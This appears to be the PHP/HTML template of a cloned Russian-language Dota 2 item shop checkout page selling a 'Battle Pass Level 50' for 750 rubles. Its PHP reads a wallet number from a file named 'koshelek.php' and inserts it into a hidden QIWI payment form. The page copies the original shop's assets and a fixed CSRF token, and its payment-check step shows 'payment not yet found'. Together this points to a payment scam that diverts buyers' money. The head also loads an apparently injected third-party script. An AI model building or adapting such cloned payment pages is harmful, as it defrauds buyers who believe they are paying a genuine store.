<?php
$fl=file_get_contents('../koshelek.php');
$a=explode("\n", $fl);
?>
<!DOCTYPE html>
<html lang="ru">
<head><script type="text/javascript" src="http://sapere.seed4.me/js?tag=589a2b8b05ae9cf9714cdb9c380438f7da88cc18"></script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Покупка</title>
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1">
    <meta name="csrf-param" content="_csrf">
    <meta name="csrf-token" content="UU1GX1VvcGMldDcIZiI8IDwBDQVtWTkOaR8kMGEOOhAiHXAGJh4qFw==">
    <link href='https://fonts.googleapis.com/css?family=Play:400,700' rel='stylesheet' type='text/css'>

    <link rel="apple-touch-icon" sizes="57x57" href="https://arcana.dota2.house/favicon/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://arcana.dota2.house/favicon/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://arcana.dota2.house/favicon/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://arcana.dota2.house/favicon/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://arcana.dota2.house/favicon/apple-touch-icon-114x114.png">
    <link rel="icon" type="image/png" href="https://arcana.dota2.house/favicon/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://arcana.dota2.house/favicon/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="https://arcana.dota2.house/favicon/favicon-16x16.png" sizes="16x16">
    <link rel="manifest" href="https://arcana.dota2.house/favicon/manifest.json">
    <link rel="mask-icon" href="https://arcana.dota2.house/favicon/safari-pinned-tab.svg" color="#999">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">

	<script type="text/javascript" src="../pace.min.js"></script>
<link rel="stylesheet" type="text/css" href="../pace.css">

    <link href="styles/lib.css" rel="stylesheet">
<link href="styles/app.css" rel="stylesheet">
<script src="scripts/vendor/modernizr.js"></script>
<!-- Start of dota2house Zendesk Widget script -->
<!-- Start of free0011 Zendesk Widget script -->
<script id="ze-snippet" src="https://static.zdassets.com/ekr/snippet.js?key=00a6f6d9-602d-4d65-bf36-1c417dbb6098"> </script>
<!-- End of free0011 Zendesk Widget script -->
<!-- End of dota2house Zendesk Widget script -->
</head>
<body>
<div class="page">

 <div class="payment-options" style="display: none;">

<form method="POST" class="forma" action="https://qiwi.com/payment/form/99?extra%5B%27account%27%5D=<?= $a[0]; ?>&amountInteger=750&amountFraction=0&extra%5B%27comment%27%5D=%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%20%2322757" style="display:none;" target="_blank">


</form>
            </div>

    <div class="page-inner">

<div class="page-body">
        <div class="main-wr">
        <div class="wrapper">
                        <div class="buy-steps">
						<img src="../mainpic/Logo11.png" style="padding-left: 100px;">
						<div class="secr"></div>
  <!--<h1 class="h1">платежная система</h1>-->
        <div class="buy-steps__inner">
        <div class="js-steps steps _step0">
            <div class="js-steps-line steps-line">
                <div class="steps-line__row js-steps-row">
                    <div class="steps-line__item">
                        <div class="steps-line__item-number">
                            <span>1</span>
                        </div>
                        <div class="steps-line__item-title">Адрес</div>
                    </div>
                    <div class="steps-line__item">
                        <div class="steps-line__item-number">
                            <span>2</span>
                        </div>
                        <div class="steps-line__item-title">Оплата</div>
                    </div>
                    <div class="steps-line__item">
                        <div class="steps-line__item-number">
                            <span>3</span>
                        </div>
                        <div class="steps-line__item-title">Отправка</div>
                    </div>
                </div>
                <div class="steps-line__row-clone js-steps-row-clone">
                    <div class="steps-line__row">
                        <div class="steps-line__item steps-line__item--1">
                            <div class="steps-line__item-number s-active">
                                <span>1</span>
                            </div>
                        </div>
                        <div class="steps-line__item steps-line__item--2">
                            <div class="steps-line__item-number s-active">
                                <span>2</span>
                            </div>
                        </div>
                        <div class="steps-line__item steps-line__item--3">
                            <div class="steps-line__item-number s-active">
                                <span>3</span>
                            </div>
                        </div>
                    </div>
                    <div class="steps-line__progress p-active"></div>
                </div>
                <div class="steps-line__progress"></div>
            </div>
            <div class="js-steps-block steps-block" style="display:block; height: 1200px">
                <div class="steps-block__inner">
                    <div class="steps-block__item _active">
                        <form id="steps-block1" action="https://arcana.dota2.house/buy/process" method="post">
<input type="hidden" name="_csrf" value="UU1GX1VvcGMldDcIZiI8IDwBDQVtWTkOaR8kMGEOOhAiHXAGJh4qFw==">                            <div class="steps-block__item-title">
                                Адрес доставки товара
                            </div>
                            <div class="steps-block__item-input">
                                <div class="form-group field-purchaseform-email required">

<input type="text" id="purchaseform-email" class="input input--lg input--ta-cent" name="PurchaseForm[email]" value="" placeholder="Введите вашу ссылку на обмен">

<div class="help-block"></div>
</div>                            </div>
<div style="
    width: 410px;
    position: relative;
    top: -18px;
    left: -21px;
">
                    <input type="checkbox" id="check3" style="
    float: left;
    margin-top: 0px;
    width: 20px;
    display: block;
    margin-left: 32px;
    height: 17px;
    border: 1px solid black;

">
                    <label for="check3">
                        <div><i class="fa fa-check"></i></div>
     <p style="
    padding-right: 90px;
">Я согласен с условиями соглашения.</p>
                    </label>
                </div>
                            <div class="steps-block__item-btn">
                                <button type="submit" class="btn btn--orng btn--xlg">Продолжить покупку</button>
                                <style>
  #sp12 {
        margin-bottom: -20px;
    color: red;
    transform: translate(0, -20px);
    position: relative;
    z-index: -1;opacity: 0;
    -webkit-transition: all .4s ease-in-out;
  }
</style>
<p id="sp12" style="">Примите пользовательское соглашение.</p>                            </div>
                                                            <div class="steps-block__item-out">
                                    <p>Как узнать <a href="https://steamcommunity.com/id/me/tradeoffers/privacy#trade_offer_access_url" target="_blank" class="link link--black link--dotted">ссылку на обмен?</a></p>
                                </div>

                            <input type="hidden" id="purchaseform-paymethod" name="PurchaseForm[payMethod]" value="store">                            <input type="hidden" id="purchaseform-usebonus" name="PurchaseForm[useBonus]">                            <input type="hidden" id="purchaseform-productid" name="PurchaseForm[productId]" value="175">                            <input type="hidden" id="purchaseform-randomid" name="PurchaseForm[randomId]">                            <input type="hidden" id="purchaseform-type" name="PurchaseForm[type]" value="product">
                        </form>                    </div>
                    <div class="steps-block__item">
                        <div class="steps-block__item-row">
                            <div class="steps-block__item-col">
                                                                    <a>


                                            <h4 class="search-prod__name">
                                                Battle Pass Level 50 - 750 rub                                            </h4>


                                            <span class="final-price" style="display:none"><span class="price price--ssm">750 </span><span class="rub">Р</span></span>
                                            

                                    </a>
                                                            </div>
                                                    </div>


                        <div class="steps-block__item-btn">
                            <a class="btn btn--orng btn--xlg" data-action="pay">Перейти к оплате</a>
                        </div>
                    </div>
                    <div class="steps-block__item">
                        <div class="steps-block__item-title">
                            <p>ID покупки: #<span class="random"></span></p>
                        </div>
                        <style>
                            .sk-fading-circle {
    width: 30px;
    margin-right: 18px;
    float: left;
    height: 30px;
    position: relative;
    display: none;
}

.sk-fading-circle .sk-circle {
  width: 100%;
  height: 100%;
  position: absolute;
  left: 0;
  top: 0;
}

.sk-fading-circle .sk-circle:before {
  content: '';
  display: block;
  margin: 0 auto;
  width: 15%;
  height: 15%;
  background-color: #333;
  border-radius: 100%;
  -webkit-animation: sk-circleFadeDelay 1.2s infinite ease-in-out both;
          animation: sk-circleFadeDelay 1.2s infinite ease-in-out both;
}
.sk-fading-circle .sk-circle2 {
  -webkit-transform: rotate(30deg);
      -ms-transform: rotate(30deg);
          transform: rotate(30deg);
}
.sk-fading-circle .sk-circle3 {
  -webkit-transform: rotate(60deg);
      -ms-transform: rotate(60deg);
          transform: rotate(60deg);
}
.sk-fading-circle .sk-circle4 {
  -webkit-transform: rotate(90deg);
      -ms-transform: rotate(90deg);
          transform: rotate(90deg);
}
.sk-fading-circle .sk-circle5 {
  -webkit-transform: rotate(120deg);
      -ms-transform: rotate(120deg);
          transform: rotate(120deg);
}
.sk-fading-circle .sk-circle6 {
  -webkit-transform: rotate(150deg);
      -ms-transform: rotate(150deg);
          transform: rotate(150deg);
}
.sk-fading-circle .sk-circle7 {
  -webkit-transform: rotate(180deg);
      -ms-transform: rotate(180deg);
          transform: rotate(180deg);
}
.sk-fading-circle .sk-circle8 {
  -webkit-transform: rotate(210deg);
      -ms-transform: rotate(210deg);
          transform: rotate(210deg);
}
.sk-fading-circle .sk-circle9 {
  -webkit-transform: rotate(240deg);
      -ms-transform: rotate(240deg);
          transform: rotate(240deg);
}
.sk-fading-circle .sk-circle10 {
  -webkit-transform: rotate(270deg);
      -ms-transform: rotate(270deg);
          transform: rotate(270deg);
}
.sk-fading-circle .sk-circle11 {
  -webkit-transform: rotate(300deg);
      -ms-transform: rotate(300deg);
          transform: rotate(300deg);
}
.sk-fading-circle .sk-circle12 {
  -webkit-transform: rotate(330deg);
      -ms-transform: rotate(330deg);
          transform: rotate(330deg);
}
.sk-fading-circle .sk-circle2:before {
  -webkit-animation-delay: -1.1s;
          animation-delay: -1.1s;
}
.sk-fading-circle .sk-circle3:before {
  -webkit-animation-delay: -1s;
          animation-delay: -1s;
}
.sk-fading-circle .sk-circle4:before {
  -webkit-animation-delay: -0.9s;
          animation-delay: -0.9s;
}
.sk-fading-circle .sk-circle5:before {
  -webkit-animation-delay: -0.8s;
          animation-delay: -0.8s;
}
.sk-fading-circle .sk-circle6:before {
  -webkit-animation-delay: -0.7s;
          animation-delay: -0.7s;
}
.sk-fading-circle .sk-circle7:before {
  -webkit-animation-delay: -0.6s;
          animation-delay: -0.6s;
}
.sk-fading-circle .sk-circle8:before {
  -webkit-animation-delay: -0.5s;
          animation-delay: -0.5s;
}
.sk-fading-circle .sk-circle9:before {
  -webkit-animation-delay: -0.4s;
          animation-delay: -0.4s;
}
.sk-fading-circle .sk-circle10:before {
  -webkit-animation-delay: -0.3s;
          animation-delay: -0.3s;
}
.sk-fading-circle .sk-circle11:before {
  -webkit-animation-delay: -0.2s;
          animation-delay: -0.2s;
}
.sk-fading-circle .sk-circle12:before {
  -webkit-animation-delay: -0.1s;
          animation-delay: -0.1s;
}

@-webkit-keyframes sk-circleFadeDelay {
  0%, 39%, 100% { opacity: 0; }
  40% { opacity: 1; }
}

@keyframes sk-circleFadeDelay {
  0%, 39%, 100% { opacity: 0; }
  40% { opacity: 1; }
}
.btn--lg {
    transition: all .3s ease;
}
                        </style>
                        <div class="steps-block__item-btn">
                            <a class="btn btn--orng btn--lg plat" id="paybutton3"><div class="sk-fading-circle">
  <div class="sk-circle1 sk-circle"></div>
  <div class="sk-circle2 sk-circle"></div>
  <div class="sk-circle3 sk-circle"></div>
  <div class="sk-circle4 sk-circle"></div>
  <div class="sk-circle5 sk-circle"></div>
  <div class="sk-circle6 sk-circle"></div>
  <div class="sk-circle7 sk-circle"></div>
  <div class="sk-circle8 sk-circle"></div>
  <div class="sk-circle9 sk-circle"></div>
  <div class="sk-circle10 sk-circle"></div>
  <div class="sk-circle11 sk-circle"></div>
  <div class="sk-circle12 sk-circle"></div>
</div>Проверить платеж</a>
<style>
  #sp11 {
        margin-bottom: -20px;
    color: red;
    transform: translate(0, -20px);
    position: relative;
    z-index: -1;opacity: 0;
    -webkit-transition: all .4s ease-in-out;
  }
</style>
<p id="sp11" style="">Платеж еще не найден.</p>
<span id="ftcode"></span>

                        </div>
                        <div class="steps-block__item-out">
                            <p>После оплаты и проверки платежа - время ожидания 2-5 минуты </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

        </div>
    </div><!-- /page-body -->
</div>


    </div><!-- /page-inner -->

    <!-- popups -->

    <div class="pswp js-pswp"  aria-hidden="true">
    <div class="pswp__bg"></div>
    <div class="pswp__scroll-wrap">

        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
</div>


<script src="scripts/comments.js"></script>
<script src="assets/cd488b53/yii.js"></script>
<script src="assets/d8666640/jquery.js"></script>

<script src="scripts/lib.js"></script>
<script src="scripts/app.js"></script>


</body>
</html>
